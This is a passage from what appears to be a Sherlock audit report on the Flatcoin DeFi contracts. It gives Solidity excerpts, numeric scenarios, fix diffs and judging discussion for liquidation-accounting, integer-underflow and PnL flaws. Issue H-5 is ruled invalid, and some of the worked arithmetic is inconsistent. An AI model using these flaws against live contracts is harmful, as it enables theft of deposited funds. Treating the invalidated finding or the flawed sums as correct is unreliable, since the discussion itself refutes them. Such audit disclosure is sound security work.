162:             additionalSizeDelta: -int256(position.additionalSize) // Since position is being closed, additionalSizeDelta should be negative.
163:         });
```

Within the `updateGlobalPositionData` function, the `profitLossTotal` at Line 179 will be -5 rETH. This means that the long trader (Bob) has lost 5 rETH.

At Line 205 below, the PnL of the long traders (-5 rETH) will be transferred to the LP's stable collateral total. In this case, the LPs gain 5 rETH.

Note that the LP's stable collateral total has been increased by 2 rETH earlier and now we are increasing it by 5 rETH again. Thus, the total gain by LPs is 7 rETH. If we add 7 rETH to the original stable collateral total, it will be 7 rETH + 5 rETH = 12 rETH. However, this is incorrect because we only have 7 rETH collateral within the system, as shown at the start.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L173

```solidity
File: FlatcoinVault.sol
173:     function updateGlobalPositionData(
174:         uint256 _price,
175:         int256 _marginDelta,
176:         int256 _additionalSizeDelta
177:     ) external onlyAuthorizedModule {
178:         // Get the total profit loss and update the margin deposited total.
179:         int256 profitLossTotal = PerpMath._profitLossTotal({globalPosition: _globalPositions, price: _price});
180: 
181:         // Note that technically, even the funding fees should be accounted for when computing the margin deposited total.
182:         // However, since the funding fees are settled at the same time as the global position data is updated,
183:         // we can ignore the funding fees here.
184:         int256 newMarginDepositedTotal = int256(_globalPositions.marginDepositedTotal) + _marginDelta + profitLossTotal;
185: 
186:         // Check that the sum of margin of all the leverage traders is not negative.
187:         // Rounding errors shouldn't result in a negative margin deposited total given that
188:         // we are rounding down the profit loss of the position.
189:         // If anything, after closing the last position in the system, the `marginDepositedTotal` should can be positive.
190:         // The margin may be negative if liquidations are not happening in a timely manner.
191:         if (newMarginDepositedTotal < 0) {
192:             revert FlatcoinErrors.InsufficientGlobalMargin();
193:         }
194: 
195:         _globalPositions = FlatcoinStructs.GlobalPositions({
196:             marginDepositedTotal: uint256(newMarginDepositedTotal),
197:             sizeOpenedTotal: (int256(_globalPositions.sizeOpenedTotal) + _additionalSizeDelta).toUint256(),
198:             lastPrice: _price
199:         });
200: 
201:         // Profit loss of leverage traders has to be accounted for by adjusting the stable collateral total.
202:         // Note that technically, even the funding fees should be accounted for when computing the stable collateral total.
203:         // However, since the funding fees are settled at the same time as the global position data is updated,
204:         // we can ignore the funding fees here
205:         _updateStableCollateralTotal(-profitLossTotal);
206:     }
```

#### Third Example

At $T0$, the marginDepositedTotal = 70 ETH, stableCollateralTotal = 100 ETH, vault's balance = 170 ETH

| Bob's Long Position                                          | Alice (LP)          |
| ------------------------------------------------------------ | ------------------- |
| Margin = 70 ETH<br />Position Size = 500 ETH<br />Leverage = (500 + 20) / 20 = 26x<br />Liquidation Fee = 50 ETH<br />Liquidation Margin = 60 ETH<br />Entry Price = \$1000 per ETH | Deposited = 100 ETH |

At $T1$​, the position's settled margin falls to 60 ETH (margin = +70, accrued fee = -5, PnL = -5) and is subjected to liquidation.

Firstly, the `settleFundingFees()` function will be executed at the start of the liquidation process. The effect of the `settleFundingFees()` function is shown below. The long trader's `marginDepositedTotal` will be reduced by 5, while the LP's `stableCollateralTotal` will increase by 5.

```solidity
settleFundingFees() = Long need to pay short 5

marginDepositedTotal = marginDepositedTotal + funding fee
marginDepositedTotal = 70 + (-5) = 65

stableCollateralTotal = 100 + (-(-5)) = 105
```

Next, [this part](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L109) of the code will be executed to send a portion of the liquidated position's margin to the liquidator and LPs.

```solidity
settledMargin > 0 => True
(settledMargin > expectedLiquidationFee) => (+60 > +50) => True
remainingMargin = uint256(settledMargin) - expectedLiquidationFee = 60 - 50 = 10
```

50 ETH will be sent to the liquidator and the remaining 10 ETH should goes to the LPs.

```solidity
vault.updateStableCollateralTotal(remainingMargin - positionSummary.profitLoss) =>
stableCollateralTotal = 105 ETH + (remaining margin - PnL)
stableCollateralTotal = 105 ETH + (10 ETH - (-5 ETH))
stableCollateralTotal = 105 ETH + (15 ETH) = 120 ETH
```

Next, the `vault.updateGlobalPositionData` function [here](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L159) will be executed.

```solidity
vault.updateGlobalPositionData({marginDelta: -(position.marginDeposited + positionSummary.accruedFunding)})
vault.updateGlobalPositionData({marginDelta: -(70 + (-5))})
vault.updateGlobalPositionData({marginDelta: -65})

profitLossTotal = -5
newMarginDepositedTotal = globalPositions.marginDepositedTotal + marginDelta + profitLossTotal
newMarginDepositedTotal = 70 + (-65) + (-5) = 0

stableCollateralTotal = stableCollateralTotal + -PnL
stableCollateralTotal = 120 + (-(5)) = 125
```

The reason why the profitLossTotal = -5 is because there is only one (1) position in the system. So, this loss actually comes from the loss of Bob's position.

The `newMarginDepositedTotal = 0` is correct. This is because the system only has 1 position, which is Bob's position; once the position is liquidated, there should be no margin deposited left in the system.

However, `stableCollateralTotal = 125` is incorrect. Because the vault's collateral balance now is 170 - 50 (send to liquidator) = 120. Thus, the tracked balance and actual collateral balance are not in sync.

## Impact

The following is a list of potential impacts of this issue:

- First Example: LPs incur unnecessary losses during liquidation, which would be avoidable if the calculations were correctly implemented from the start.
- Second Example: An error in the protocol's accounting mechanism led to an inflated increase in the LPs' stable collateral total, which in turn inflated the number of tokens users can withdraw from the system.
- Third Example: The accounting error led to the tracked balance and actual collateral balance not being in sync.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L85

## Tool used

Manual Review

## Recommendation

To remediate the issue, the `profitLossTotal` should be excluded within the `updateGlobalPositionData` function during liquidation. 

```diff
- profitLossTotal = PerpMath._profitLossTotal(...)

- newMarginDepositedTotal = globalPositions.marginDepositedTotal + _marginDelta + profitLossTotal
+ newMarginDepositedTotal = globalPositions.marginDepositedTotal + _marginDelta

if (newMarginDepositedTotal < 0) {
    revert FlatcoinErrors.InsufficientGlobalMargin();
}

_globalPositions = FlatcoinStructs.GlobalPositions({
    marginDepositedTotal: uint256(newMarginDepositedTotal),
    sizeOpenedTotal: (int256(_globalPositions.sizeOpenedTotal) + _additionalSizeDelta).toUint256(),
    lastPrice: _price
});
        
- _updateStableCollateralTotal(-profitLossTotal);
```

The existing `updateGlobalPositionData` function still needs to be used for other functions besides liquidation. As such, consider creating a separate new function (e.g., updateGlobalPositionDataDuringLiquidation) solely for use during the liquidation that includes the above fixes.

The following attempts to apply the above fix to the three (3) examples described in the report to verify that it is working as intended.

#### First Example

Let the current `StableCollateralTotal` be $x$ and `marginDepositedTotal` be $y$ at the start of the liquidation.

- **During funding settlement:** 

StableCollateralTotal = $x$​​ + 100

marginDepositedTotal = $y$ - 100

- **During updateStableCollateralTotal:**

```solidity
vault.updateStableCollateralTotal(int256(remainingMargin) - positionSummary.profitLoss);
vault.updateStableCollateralTotal(0 - (+100));
vault.updateStableCollateralTotal(-100);
```

StableCollateralTotal = ($x$ + 100) - 100 = $x$

- **During Global Position Update:** 

marginDelta = -(position.marginDeposited + positionSummary.accruedFunding) = -(20 + (-100)) = 80

newMarginDepositedTotal = marginDepositedTotal + marginDelta = ($y$ - 100) + 80 = ($y$ - 20)

No change to StableCollateralTotal here. Remain at $x$

- **Conclusion:** 

1) The LPs should not gain or lose in this scenario. Thus, the fact that the StableCollateralTotal remains as $x$ before and after the liquidation is correct.
2) The `marginDepositedTotal` is ($y$ - 20) is correct because the liquidated position's remaining margin is 20 ETH. Thus, when this position is liquidated, 20 ETH should be deducted from the `marginDepositedTotal`
3) No revert during the execution.

#### Second Example

- **During updateStableCollateralTotal:**

```solidity
vault.updateStableCollateralTotal(settledMargin - positionSummary.profitLoss);
vault.updateStableCollateralTotal(-3 rETH - (-5 rETH));
vault.updateStableCollateralTotal(+2);
```

StableCollateralTotal = 5 + 2 = 7 ETH

- **During Global Position Update:**

marginDelta = -(position.marginDeposited + positionSummary.accruedFunding) = -(2 + 0) = -2

marginDepositedTotal = marginDepositedTotal + marginDelta = 2 + (-2) = 0

- **Conclusion:**

StableCollateralTotal = 7 ETH, marginDepositedTotal = 0 (Total 7 ETH tracked in the system)

Balance of collateral in the system = 7 ETH. Thus, both values are in sync. No revert.

#### Third Example

- **During funding settlement (Transfer 5 from Long to LP):** 

marginDepositedTotal = 70 + (-5) = 65

StableCollateralTotal = 100 + 5 = 105

- **Transfer fee to Liquidator**

50 ETH sent to the liquidator from the system: Balance of collateral in the system = 170 ETH - 50 ETH = 120 ETH

- **During updateStableCollateralTotal:**

```solidity
vault.updateStableCollateralTotal(remainingMargin - positionSummary.profitLoss) =>
stableCollateralTotal = 105 ETH + (remaining margin - PnL)
stableCollateralTotal = 105 ETH + (10 ETH - (-5 ETH))
stableCollateralTotal = 105 ETH + (15 ETH) = 120 ETH
```

StableCollateralTotal = 120 ETH

- **During Global Position Update:** 

marginDelta= -(position.marginDeposited + positionSummary.accruedFunding) = -(70 + (-5)) = -65

marginDepositedTotal = 65 + (-65) = 0

- **Conclusion:**

StableCollateralTotal = 120 ETH, marginDepositedTotal = 0 (Total 120 ETH tracked in the system)

Balance of collateral in the system = 120 ETH. Thus, both values are in sync. No revert.



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: whole lot of lessons taught here; high(3)



**rashtrakoff**

Wow, this is a detailed explanation. We did find this issue during the audit and glad that you have found it as well!

**itsermin**

I believe this type of scenario is also fixed in the PR for #186:
https://github.com/dhedge/flatcoin-v1/pull/266/commits/3a95a5b932fb9dcd770afd589751ecfd151360a8

It appears that this issue #186 and #192 are covering the same ground.

**sherlock-admin**

The protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/266.

# Issue H-4: `marginDepositedTotal` can be significantly inflated 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/181 

## Found by 
CL001, Dliteofficial, KingNFT, chaduke, evmboi32, juan, ni8mare, vvv, xiaoming90
## Summary

The `marginDepositedTotal` can be significantly inflated due to an underflow that occurs when casting int256 to uint256, leading to core functionalities and accounting of the protocol being broken and assets being stuck.

## Vulnerability Detail

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L233

```solidity
File: FlatcoinVault.sol
216:     function settleFundingFees() public returns (int256 _fundingFees) {
..SNIP..
226:         // Calculate the funding fees accrued to the longs.
227:         // This will be used to adjust the global margin and collateral amounts.
228:         _fundingFees = PerpMath._accruedFundingTotalByLongs(_globalPositions, unrecordedFunding);
229: 
230:         // In the worst case scenario that the last position which remained open is underwater,
231:         // we set the margin deposited total to 0. We don't want to have a negative margin deposited total.
232:         _globalPositions.marginDepositedTotal = (int256(_globalPositions.marginDepositedTotal) > _fundingFees)
233:             ? uint256(int256(_globalPositions.marginDepositedTotal) + _fundingFees)
234:             : 0;
235: 
236:         _updateStableCollateralTotal(-_fundingFees);
```

The `_globalPositions.marginDepositedTotal` is uint256. Thus, the value assigned to this state variable must always be a non-negative value. The logic in Lines 232-234 intends to ensure that the system can never have a negative margin deposited total.

The `_fundingFees` funding fee at Line 228 above can be positive (gain by long traders) or negative (loss by long traders). 

Assume that the `_fundingFees` is `-20` (negative indicating a loss by long traders and a win for LP stakers) and the current `_globalPositions.marginDepositedTotal` is 10. 

When Line 232 above execute, the condition `(int256(_globalPositions.marginDepositedTotal) > _fundingFees)` equal to `(+10 > -20)` and evaluate to True.

Subseqently, Line 233 will be executed `uint256(int256(_globalPositions.marginDepositedTotal) + _fundingFees)`, which lead to the following result:

```solidity
➜ uint256(int256(10) - 20)
Type: uint
├ Hex: 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6
└ Decimal: 115792089237316195423570985008687907853269984665640564039457584007913129639926
```

An integer underflow due to unsafe casting has occurred, which results in `marginDepositedTotal` being set to a significantly large number (`115792089237316195423570985008687907853269984665640564039457584007913129639926`) and become significantly inflated.

The operation `int256(10) - 20` results in a negative value (-10). When casting `int256(-10)` to uint256, Instead of throwing an error, Solidity handles this underflow by wrapping the result to the maximum value that `uint256` can represent and then subtracts the deficit, which results in the above large number.

Note that Solidity does not automatically check for overflows or underflows when casting.

## Impact

The `marginDepositedTotal` is one of the most important states in the system, along with the `stableCollateralTotal`. It represents the total amount of margin deposited or owned by the long traders. The entire functioning of the protocol relies on the proper accounting of the `marginDepositedTotal`. If the `marginDepositedTotal` is incorrect, as shown in the above example, the protocol and the vault are effectively broken.

In addition, the `0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6` value in the `marginDepositedTotal` is already close to the max number supported by uint256. Thus, most operations such as opening/adjusting/closing position, funding fee settlement, or PnL accruing that increase the `_globalPositions.marginDepositedTotal` further will not work as it will result in an overflow. Since users cannot close their positions, that also means that their assets are stuck within the system.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L233

## Tool used

Manual Review

## Recommendation

Consider performing the calculation in `int256` and then checking if the result is positive before casting it back to `uint256`. If the result is negative or zero, you can set `_globalPositions.marginDepositedTotal` to 0.

```diff
+ int256 newMarginDepositedTotal = int256(_globalPositions.marginDepositedTotal) + _fundingFees;
// In the worst case scenario that the last position which remained open is underwater,
// we set the margin deposited total to 0. We don't want to have a negative margin deposited total.
- _globalPositions.marginDepositedTotal = (int256(_globalPositions.marginDepositedTotal) > _fundingFees)
+ _globalPositions.marginDepositedTotal = (newMarginDepositedTotal > 0)
-	? uint256(int256(_globalPositions.marginDepositedTotal) + _fundingFees)
+	? uint256(newMarginDepositedTotal)
	: 0;
```



## Discussion

**sherlock-admin**

3 comment(s) were left on this issue during the judging contest.

**karanctf** commented:
>  same as 78

**ubl4nk** commented:
> invalid -> this is a Low, marginDepositedTotal should be higher than 57896044618658097711785492504343953926634992332820282019728792003956564819967 for this scenario to happen, just Google it "int256 range"

**takarez** commented:
>  valid: high(2)



**sherlock-admin**

The protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/275.

# Issue H-5: Inconsistent in the margin transferred to LP during liquidation when settledMargin < 0 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/182 

The protocol has acknowledged this issue.

## Found by 
xiaoming90
## Summary

There is a discrepancy in the approach of computing the expected gain and loss per share within the `liquidate` and `_stableCollateralPerShareLiquidation` functions, which will lead to an unexpected revert during the liquidation process.

Liquidation is the core component of the protocol and is important to the solvency of the protocol. If the liquidation does not execute as intended, underwater positions and bad debt accumulate in the protocol, threatening the solvency of the protocol.

## Vulnerability Detail

At Line 109 below, the `settledMargin` is greater than 0, a portion (or all) of the margin will be sent to the liquidator and LPs. If the `settledMargin` is negative, the LPs will bear the cost of the underwater position's loss.

When the `liquidate` function is executed, the `liquidationInvariantChecks` modifier will be triggered to perform invariant checks before and after the execution.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L85

```solidity
File: LiquidationModule.sol
085:     function liquidate(uint256 tokenId) public nonReentrant whenNotPaused liquidationInvariantChecks(vault, tokenId) {
086:         FlatcoinStructs.Position memory position = vault.getPosition(tokenId);
087: 
088:         (uint256 currentPrice, ) = IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY)).getPrice();
089: 
090:         // Settle funding fees accrued till now.
091:         vault.settleFundingFees();
092: 
093:         // Check if the position can indeed be liquidated.
094:         if (!canLiquidate(tokenId)) revert FlatcoinErrors.CannotLiquidate(tokenId);
095: 
096:         FlatcoinStructs.PositionSummary memory positionSummary = PerpMath._getPositionSummary(
097:             position,
098:             vault.cumulativeFundingRate(),
099:             currentPrice
100:         );
101: 
102:         // Check that the total margin deposited by the long traders is not -ve.
103:         // To get this amount, we will have to account for the PnL and funding fees accrued.
104:         int256 settledMargin = positionSummary.marginAfterSettlement;
105: 
106:         uint256 liquidatorFee;
107: 
108:         // If the settled margin is greater than 0, send a portion (or all) of the margin to the liquidator and LPs.
109:         if (settledMargin > 0) {
// Do something
138:         } else {
139:             // If the settled margin is -ve then the LPs have to bear the cost.
140:             // Adjust the stable collateral total to account for user's profit/loss and the negative margin.
141:             // Note: We are adding `settledMargin` and `profitLoss` instead of subtracting because of their sign (which will be -ve).
142:             vault.updateStableCollateralTotal(settledMargin - positionSummary.profitLoss);
143:         }
```

The `liquidationInvariantChecks` modifier will trigger the `_stableCollateralPerShareLiquidation` function internally. This function will compute the `expectedStableCollateralPerShare` based on the remaining margin (also called `settledMargin`), as shown in Line 130 below. 

Assume that the liquidated position's current `settledMargin` is -3 (marginDeposit=2, accruedFee=0, PnL=-5). 

In this case, at Line 142 above within the `liquidate` function, the expected gain or loss of the LP is computed via `settledMargin - positionSummary.profitLoss`, which is equal to +2 (-3 - (-5))

However, within the invariant check (`_stableCollateralPerShareLiquidation`) below, at Line 150 below, the expected gain or loss of the LP is computed only via the `settledMargin` (remaining margin), which is equal to -3.

Thus, there is a discrepancy in the approach of computing the expected gain and loss per share within the `liquidate` and `_stableCollateralPerShareLiquidation` functions, and the `expectedStableCollateralPerShare` computed will deviate from the actual gain/loss per share during liquidation, leading to an unexpected revert during the check at Line 152 below during the liquidation process.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/misc/InvariantChecks.sol#L118

```solidity
File: InvariantChecks.sol
118:     function _stableCollateralPerShareLiquidation(
119:         IStableModule stableModule,
120:         uint256 liquidationFee,
121:         int256 remainingMargin,
122:         uint256 stableCollateralPerShareBefore,
123:         uint256 stableCollateralPerShareAfter
124:     ) private view {
125:         uint256 totalSupply = stableModule.totalSupply();
126: 
127:         if (totalSupply == 0) return;
128: 
129:         int256 expectedStableCollateralPerShare;
130:         if (remainingMargin > 0) {
131:             if (remainingMargin > int256(liquidationFee)) {
132:                 // position is healthy and there is a keeper fee taken from the margin
133:                 // evaluate exact increase in stable collateral
134:                 expectedStableCollateralPerShare =
135:                     int256(stableCollateralPerShareBefore) +
136:                     (((remainingMargin - int256(liquidationFee)) * 1e18) / int256(stableModule.totalSupply()));
137:             } else {
138:                 // position has less or equal margin than liquidation fee
139:                 // all the margin will go to the keeper and no change in stable collateral
140:                 if (stableCollateralPerShareBefore != stableCollateralPerShareAfter)
141:                     revert FlatcoinErrors.InvariantViolation("stableCollateralPerShareLiquidation");
142: 
143:                 return;
144:             }
145:         } else {
146:             // position is underwater and there is no keeper fee
147:             // evaluate exact decrease in stable collateral
148:             expectedStableCollateralPerShare =
149:                 int256(stableCollateralPerShareBefore) +
150:                 ((remainingMargin * 1e18) / int256(stableModule.totalSupply()));
151:         }
152:         if (
153:             expectedStableCollateralPerShare + 1e6 < int256(stableCollateralPerShareAfter) || // rounding error
154:             expectedStableCollateralPerShare - 1e6 > int256(stableCollateralPerShareAfter)
155:         ) revert FlatcoinErrors.InvariantViolation("stableCollateralPerShareLiquidation");
156:     }
```

## Impact

Liquidation is the core component of the protocol and is important to the solvency of the protocol. If the liquidation does not execute as intended, such as in the scenario mentioned above where the invariant check will revert unexpectedly, underwater positions and bad debt accumulate in the protocol, threatening the solvency of the protocol.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/misc/InvariantChecks.sol#L118

## Tool used

Manual Review

## Recommendation

Ensure that the formula used to compute the expected `StableCollateralPerShare` during the invariant check is consistent with the formula used within the actual liquidation function.

```diff
// position is underwater and there is no keeper fee
// evaluate exact decrease in stable collateral
expectedStableCollateralPerShare =
    int256(stableCollateralPerShareBefore) +
-   ((remainingMargin * 1e18) / int256(stableModule.totalSupply()));
+	(((remainingMargin - positionSummary.profitLoss) * 1e18) / int256(stableModule.totalSupply()));    
```



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: there is a decrepancy that will cause the liquidation to revert; high(4)



**santipu03**

Escalate

This issue is a duplicate of #180. 

Both issues have the same root cause, which is not correctly handling the PnL when updating the total collateral on liquidations. The fix for this issue should be to update the total collateral correctly on `liquidate()`, the function `_stableCollateralPerShareLiquidation()` doesn't have to change. 

Fixing issue #180 will fix this issue as well, therefore, they're duplicates. 

**sherlock-admin2**

> Escalate
> 
> This issue is a duplicate of #180. 
> 
> Both issues have the same root cause, which is not correctly handling the PnL when updating the total collateral on liquidations. The fix for this issue should be to update the total collateral correctly on `liquidate()`, the function `_stableCollateralPerShareLiquidation()` doesn't have to change. 
> 
> Fixing issue #180 will fix this issue as well, therefore, they're duplicates. 

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**xiaoming9090**

Disagree with the escalation. This issue is not a duplicate of Issue 180.

The root cause of this issue is a discrepancy between the formula used in the invariant check and the actual liquidation function, which will lead to an unexpected revert during the liquidation process, while Issue 180 discusses the wrong formula used when computing the PnL.

Fixing Issue 180 blindly without cross-checking the issue in this report will result in an incomplete fix being implemented.

Most importantly, the solution I proposed in this report:

```diff
function _stableCollateralPerShareLiquidation(
..SNIP..
// position is underwater and there is no keeper fee
// evaluate exact decrease in stable collateral
expectedStableCollateralPerShare =
    int256(stableCollateralPerShareBefore) +
-   ((remainingMargin * 1e18) / int256(stableModule.totalSupply()));
+	(((remainingMargin - positionSummary.profitLoss) * 1e18) / int256(stableModule.totalSupply()));  
```

mapped to the following part (Line 142) of the liquidation logic, where I pointed out the discrepancy. Above uses `remainingMargin/settledMargin`, while below uses `settledMargin - positionSummary.profitLoss`.

```solidity
File: LiquidationModule.sol
085:     function liquidate(uint256 tokenId) public nonReentrant whenNotPaused liquidationInvariantChecks(vault, tokenId) {
086:         FlatcoinStructs.Position memory position = vault.getPosition(tokenId);
..SNIP..
139:             // If the settled margin is -ve then the LPs have to bear the cost.
140:             // Adjust the stable collateral total to account for user's profit/loss and the negative margin.
141:             // Note: We are adding `settledMargin` and `profitLoss` instead of subtracting because of their sign (which will be -ve).
142:             vault.updateStableCollateralTotal(settledMargin - positionSummary.profitLoss);
```

It is unrelated to the solution in Issue 180. In Issue 180, the fix is only to correct the formula within the `updateGlobalPositionData` function. Line 142 of the code in the `liquidate` function above is correct and mathematically sound and should not be updated to intentionally make it aligned with the invariant check, which will cause another bug to surface if one does so.

**itsermin**

@xiaoming9090 we have a few of these [underwater case liquidation test scenarios,](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/test/unit/Liquidation-Module/Liquidate.t.sol#L281) but none of them revert on liquidation.

If there was an incorrect calculation here, I would expect them to revert, right?

**Evert0x**

Planning to reject escalation and keep issue state as is.

> The root cause of this issue is a discrepancy between the formula used in the invariant check and the actual liquidation function, which will lead to an unexpected revert during the liquidation process, while Issue 180 discusses the wrong formula used when computing the PnL.

I believe this is correct and both reports identify a different issue. 

@xiaoming9090 do you have a reply to the sponsor? https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/182#issuecomment-1960453456

**xiaoming9090**

@Evert0x This issue should be invalid.

I have reviewed this issue again. When the `stableCollateralPerShareBefore` is retrieved from [here](https://github.com/sherlock-audit/2023-12-flatmoney-xiaoming9090/blob/53e44522a88e1038db88fdca49cb45a15cbef7a4/flatcoin-v1/src/misc/InvariantChecks.sol#L61), the PnL of -5 of the liquidated account already factored in. Thus, the LP's total stable collateral increased by 5. 

Subsequently, the settled margin of -3 is added over [here](https://github.com/sherlock-audit/2023-12-flatmoney-xiaoming9090/blob/53e44522a88e1038db88fdca49cb45a15cbef7a4/flatcoin-v1/src/misc/InvariantChecks.sol#L150). Thus, the overall gain/loss of LP is (5 + -3) = 2. The final result is aligned with the one in the liquidate function, so the invariant check will not revert unexpectedly. 





**Czar102**

In that case, planning to invalidate (even though this wasn't a proposition in the escalation, but this shows that the two issues are not duplicates and another state change should be made).

**Czar102**

Result:
Invalid
Unique

Rejecting the escalation despite there is a change in issue state since the escalation didn't make correct point.

**sherlock-admin2**

Escalations have been resolved successfully!

Escalation status:
- [santipu03](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/182/#issuecomment-1956476915): rejected

# Issue H-6: Asymmetry in profit and loss (PnL) calculations 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/186 

## Found by 
KingNFT, chaduke, xiaoming90
## Summary

An asymmetry arises in profit and loss (PnL) calculations due to relative price changes. This discrepancy emerges when adjustments to a position lead to differing PnL outcomes despite equivalent absolute price shifts in rETH, leading to loss of assets.

## Vulnerability Detail

#### Scenario 1

Assume at $T0$, the price of rETH is \$1000. Bob opened a long position with the following state:

- Position Size = 40 ETH
- Margin = $x$ ETH

At $T2$, the price of rETH increased to \$2000. Thus, Bob's PnL is as follows: he gains 20 rETH.

```solidity
PnL = Position Size * Price Shift / Current Price
PnL = Position Size * (Current Price - Last Price) / Current Price
PnL = 40 rETH * ($2000 - $1000) / $2000
PnL = $40000 / $2000 = 20 rETH
```

Important Note: In terms of dollars, each ETH earns \$1000. Since the position held 40 ETH, the position gained \$40000.

#### Scenario 2

Assume at $T0$, the price of rETH is \$1000. Bob opened a long position with the following state:

- Position Size = 40 ETH
- Margin = $x$ ETH

At $T1$, the price of rETH dropped to \$500. An adjustment is executed against Bob's long position, and a `newMargin` is computed to account for the PnL accrued till now, as shown in Line 191 below. Thus, Bob's PnL is as follows: he lost 40 rETH.

```solidity
PnL = Position Size * Price Shift / Current Price
PnL = Position Size * (Current Price - Last Price) / Current Price
PnL = 40 rETH * ($500 - $1000) / $500
PnL = -$20000 / $500 = -40 rETH
```

At this point, the position's `marginDeposited` will be $(x - 40)\ rETH$ and `lastPrice` set to \$500.

Important Note 1: In terms of dollars, each ETH lost $500. Since the position held 40 ETH, the position lost \$20000

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L211

```solidity
File: LeverageModule.sol
190:         // This accounts for the profit loss and funding fees accrued till now.
191:         uint256 newMargin = (marginAdjustment +
192:             PerpMath
193:                 ._getPositionSummary({position: position, nextFundingEntry: cumulativeFunding, price: adjustPrice})
194:                 .marginAfterSettlement).toUint256();
..SNIP..
211:         vault.setPosition(
212:             FlatcoinStructs.Position({
213:                 lastPrice: adjustPrice,
214:                 marginDeposited: newMargin,
215:                 additionalSize: newAdditionalSize,
216:                 entryCumulativeFunding: cumulativeFunding
217:             }),
218:             announcedAdjust.tokenId
219:         );
```

At $T2$, the price of rETH increases from \$500 to \$2000. Thus, Bob's PnL is as follows:

```solidity
PnL = Position Size * Price Shift / Current Price
PnL = Position Size * (Current Price - Last Price) / Current Price
PnL = 40 rETH * ($2000 - $500) / $500
PnL = $60000 / $2000 = 30 rETH
```

At this point, the position's `marginDeposited` will be $(x - 40 + 30)\ rETH$, which is equal to $(x - 10)\ rETH$. This effectively means that Bob has lost 10 rETH of the total margin he deposited.

Important Note 2: In terms of dollars, each ETH gains $1500. Since the position held 40 ETH, the position gained \$60000.

Important Note 3: If we add up the loss of \$20000 at 𝑇1 and the gain of \$60000 at 𝑇2, the overall PnL is a gain of \$40000 at the end.

#### Analysis

The final PnL of a position should be equivalent regardless of the number of adjustments/position updates made between $T0$ and $T2$. However, the current implementation does not conform to this property. Bob gains 20 rETH in the first scenario, while Bob loses 10 rETH in the second scenario. 

There are several reasons that lead to this issue:

- The PnL calculation emphasizes relative price changes (percentage) rather than absolute price changes (dollar value). This leads to asymmetric rETH outcomes for the same absolute dollar gains/losses. If we have used the dollar to compute the PnL, both scenarios will return the same correct result, with a gain of $40000 at the end, as shown in the examples above. (Refer to the important note above)
- The formula for PnL calculation is sensitive to the proportion of the price change relative to the current price. This causes the rETH gains/losses to be non-linear even when the absolute dollar gains/losses are the same.

#### Extra Example

The current approach to computing the PnL will also cause issues in another area besides the one shown above. The following example aims to demonstrate that it can cause a desync between the PnL accumulated by the global positions AND the PnL of all the individual open positions in the system.

The following shows the two open positions owned by Alice and Bob. The current price of ETH is \$1000 and the current time is $T0$

| Alice's Long Position                             | Bob's Long Position                              |
| ------------------------------------------------- | ------------------------------------------------ |
| Position Size = 100 ETH<br />Entry Price = \$1000 | Position Size = 50 ETH<br />Entry Price = \$1000 |

At $T1$, the price of ETH drops from \$1000 to $750, and the `updateGlobalPositionData` function is executed. The `profitLossTotal` is computed as below. Thus, the `marginDepositedTotal` decreased by 50 ETH.

```solidity
priceShift = $750 - $1000 = -$250
profitLossTotal = (globalPosition.sizeOpenedTotal * priceShift) / price
profitLossTotal = (150 ETH * -$250) / $750 = -50 ETH
```

At $T2$, the price of ETH drops from \$750 to \$500, and the `updateGlobalPositionData` function is executed. The `profitLossTotal` is computed as below. Thus, the `marginDepositedTotal` decreased by 75 ETH.

```solidity
priceShift = $500 - $750 = -$250
profitLossTotal = (globalPosition.sizeOpenedTotal * priceShift) / price
profitLossTotal = (150 ETH * -$250) / $500 = -75 ETH
```

In total, the `marginDepositedTotal` decreased by 125 ETH (50 + 75), which means that the long traders lost 125 ETH from $T0$ to $T2$.

However, when we compute the loss of Alice and Bob's positions at $T2$, they lost a total of 150 ETH, which deviated from the loss of 125 ETH in the global position data.

```solidity
Alice's PNL
priceShift = current price - entry price = $500 - $1000 = -$500
PnL = (position size * priceShift) / current price
PnL = (100 ETH * -$500) / $500 = -100 ETH

Bob's PNL
priceShift = current price - entry price = $500 - $1000 = -$500
PnL = (position size * priceShift) / current price
PnL = (50 ETH * -$500) / $500 = -50 ETH
```

## Impact

Loss of assets, as demonstrated in the second scenario in the first example above. The tracking of profit and loss, which is the key component within the protocol, both on the position level and global level, is broken.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L211

## Tool used

Manual Review

## Recommendation

Consider tracking the PnL in dollar value/term to ensure consistency between the rETH and dollar representations of gains and losses.

#### Appendix

